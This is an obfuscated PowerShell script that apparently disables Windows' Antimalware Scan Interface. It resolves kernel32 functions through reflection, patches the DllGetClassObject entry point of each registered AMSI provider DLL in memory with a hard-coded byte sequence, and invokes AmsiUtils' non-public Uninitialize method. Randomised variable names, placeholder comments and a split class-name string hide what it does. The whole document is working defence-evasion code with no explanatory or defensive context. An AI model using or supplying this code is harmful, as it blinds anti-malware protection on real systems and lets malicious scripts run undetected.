# Microsoft".
# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".

# Microsoft".

function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $vyeetmDMQSQUYcaSPBwHhnunWgeeG,
        [Parameter(Position = 1, Mandatory = $True)] [String] $CQWAQbAGkrfaRBLrmnyVKgnAKomZMSbYlvRYW
    )

    # Microsoft".
    $zRhrYOERWCKeloAawJJHbOzZWmwc = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $LEhmuJgLUhBpyyRunaXOyamBTGN = $zRhrYOERWCKeloAawJJHbOzZWmwc.GetType('Microsoft.Win32.UnsafeNativeMethods')
    # Microsoft".
    $QUbBuosaVOUkPbekAzpMufPiwqpdgYFkfKSa = $LEhmuJgLUhBpyyRunaXOyamBTGN.GetMethod('GetModuleHandle')
    $hqXIYzZYxOqTyPXpwIJlPFaFuSeyjn = $LEhmuJgLUhBpyyRunaXOyamBTGN.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    # Microsoft".
    $NgNFJiWhLVANzBNUqNgogwmGECQar = $QUbBuosaVOUkPbekAzpMufPiwqpdgYFkfKSa.Invoke($null, @($vyeetmDMQSQUYcaSPBwHhnunWgeeG))
    $pzLSiFkoorqFFeHrxfCRHdvgBVOwWgtpawoVhQCuRGvAc = New-Object IntPtr
    $irgOaIYxllzQOiypUzVwPFiWRwvpcphZRmDPZTj = New-Object System.Runtime.InteropServices.HandleRef($pzLSiFkoorqFFeHrxfCRHdvgBVOwWgtpawoVhQCuRGvAc, $NgNFJiWhLVANzBNUqNgogwmGECQar)
    # Microsoft".
    return $hqXIYzZYxOqTyPXpwIJlPFaFuSeyjn.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$irgOaIYxllzQOiypUzVwPFiWRwvpcphZRmDPZTj, $CQWAQbAGkrfaRBLrmnyVKgnAKomZMSbYlvRYW))
}
function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $XMTvKofckqcIHAsecCQMLQuNVYjjbXLGSrAFEqDR = (New-Object Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $gkNUVKUFDbvAQXEAhZfflZyjeUiE = [Void]
    )

    $wdSScpGRSyXDrlKTgTqPgCjmFsjAXTXLsRQSomhlKW = [AppDomain]::CurrentDomain
    $SLmAlkzZOfKQBVDjEBhtZhpybrsjB = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AvwZppUaTSYooxCDZYeGIawCMUZVFBnzxxYDV = $wdSScpGRSyXDrlKTgTqPgCjmFsjAXTXLsRQSomhlKW.DefineDynamicAssembly($SLmAlkzZOfKQBVDjEBhtZhpybrsjB, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $nKpKuGYIoBPnTwOYoUILjefDacZIb = $AvwZppUaTSYooxCDZYeGIawCMUZVFBnzxxYDV.DefineDynamicModule('InMemoryModule', $false)
    $xREOxNFityerhhopZTIqjOFVlzhKyNwWNpH = $nKpKuGYIoBPnTwOYoUILjefDacZIb.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $vpVivkraaDpywGebThUTpGFGKyyycIltfaeyNhxVeThEl = $xREOxNFityerhhopZTIqjOFVlzhKyNwWNpH.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $XMTvKofckqcIHAsecCQMLQuNVYjjbXLGSrAFEqDR)
    $vpVivkraaDpywGebThUTpGFGKyyycIltfaeyNhxVeThEl.SetImplementationFlags('Runtime, Managed')
    $PluWZHOiRbAkzzJhQzUHTHRK = $xREOxNFityerhhopZTIqjOFVlzhKyNwWNpH.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $gkNUVKUFDbvAQXEAhZfflZyjeUiE, $XMTvKofckqcIHAsecCQMLQuNVYjjbXLGSrAFEqDR)
    $PluWZHOiRbAkzzJhQzUHTHRK.SetImplementationFlags('Runtime, Managed')
        
    Write-Output $xREOxNFityerhhopZTIqjOFVlzhKyNwWNpH.CreateType()
}
$ofYLOSZFkQMXiJCuCOUznwUuCyRwiKEuEtDH = Get-ProcAddress kernel32.dll LoadLibraryA
$FFLXceGnyvhGqRtWGirnRBgblvZBSd = Get-DelegateType @([String]) ([IntPtr])
$NHrfpnuQQKkhjEBfRTFrWghM = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ofYLOSZFkQMXiJCuCOUznwUuCyRwiKEuEtDH,
$FFLXceGnyvhGqRtWGirnRBgblvZBSd)
$XMRYZJNLxAldxvpjjtZWNAEhXudXpS = Get-ProcAddress kernel32.dll GetProcAddress
$CwUYRNvCcjGirAvFdnFMSqvliDuAyMWmpGS = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
$hqXIYzZYxOqTyPXpwIJlPFaFuSeyjn = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($XMRYZJNLxAldxvpjjtZWNAEhXudXpS,
$CwUYRNvCcjGirAvFdnFMSqvliDuAyMWmpGS)
$ylrQokmzmDUJqzBpMtelgVkfe = Get-ProcAddress kernel32.dll VirtualProtect
$HJvqwyftZvoabuzenDQKOemchz = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$jjtTnLPIWtlNZiEBsMZCWfvZwpNZqXwLWHiNS = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ylrQokmzmDUJqzBpMtelgVkfe,
$HJvqwyftZvoabuzenDQKOemchz)

$eXFmPTMKalibjIJMWDsFaWBJtZIwxjnKjV = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
$gTDyNSAtgyeVzNRKWtoz = 0

foreach ($VqlmDLRJrkiEuGfCiaLHbTvtpQZBqSlDZ in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Name)
{
    $iUOAZsHbKBTGRelRwFbjZQXBubSghdCcvrbhhaRw = 'HKLM:\Software\Classes\CLSID\' + $VqlmDLRJrkiEuGfCiaLHbTvtpQZBqSlDZ + '\InprocServer32'
    $piOpAzBoYSrSpMUxOFhKgRkpNvgdxg = Get-ItemPropertyValue -Name '(Default)' $iUOAZsHbKBTGRelRwFbjZQXBubSghdCcvrbhhaRw -ErrorAction SilentlyContinue
    if ($piOpAzBoYSrSpMUxOFhKgRkpNvgdxg)
    {
        $apGTYTyJNZwIHPEoldGOzHvcDbcUwGFxlKqyXgPp = Split-Path $piOpAzBoYSrSpMUxOFhKgRkpNvgdxg -leaf
        $ORuvOnrCiNbGofReeNguCXwrKzqTzNhWZym = $apGTYTyJNZwIHPEoldGOzHvcDbcUwGFxlKqyXgPp -replace '"', ""
        $DqJsWQqeGEqEScdhBYuQEgaipyOLaskiyXMxWhKb = $NHrfpnuQQKkhjEBfRTFrWghM.Invoke($ORuvOnrCiNbGofReeNguCXwrKzqTzNhWZym) 
        if ($DqJsWQqeGEqEScdhBYuQEgaipyOLaskiyXMxWhKb -ne 0)
        {
            Write-host "[*] Provider found - " $apGTYTyJNZwIHPEoldGOzHvcDbcUwGFxlKqyXgPp
            $hDCPkodSZyTRogywbDybqtaxyZvFddjGsNiTbpBa = $hqXIYzZYxOqTyPXpwIJlPFaFuSeyjn.Invoke($DqJsWQqeGEqEScdhBYuQEgaipyOLaskiyXMxWhKb, "DllGetClassObject")        
            $jjtTnLPIWtlNZiEBsMZCWfvZwpNZqXwLWHiNS.Invoke($hDCPkodSZyTRogywbDybqtaxyZvFddjGsNiTbpBa, [uint32]$eXFmPTMKalibjIJMWDsFaWBJtZIwxjnKjV.Length, 0x40, [ref]$gTDyNSAtgyeVzNRKWtoz)
            [System.Runtime.InteropServices.Marshal]::Copy($eXFmPTMKalibjIJMWDsFaWBJtZIwxjnKjV, 0, $hDCPkodSZyTRogywbDybqtaxyZvFddjGsNiTbpBa, $eXFmPTMKalibjIJMWDsFaWBJtZIwxjnKjV.Length)
        }
    }
}

$object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
$kweFRFOronwxKKpJUoTKgqlSAnNxnbzCBzzeQVyTCZz = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
$kweFRFOronwxKKpJUoTKgqlSAnNxnbzCBzzeQVyTCZz.Invoke($object,$null)
